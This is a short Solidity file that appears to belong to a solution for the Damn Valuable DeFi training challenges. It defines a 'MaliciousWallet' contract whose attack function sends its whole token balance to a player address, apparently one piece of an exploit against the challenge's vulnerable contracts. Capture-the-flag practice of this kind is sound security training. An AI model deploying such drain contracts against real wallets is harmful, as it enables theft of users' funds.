// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../DamnValuableToken.sol";

contract MaliciousWallet {
    function attack(address player, DamnValuableToken token) external {
        token.transfer(player, token.balanceOf(address(this)));
    }
}
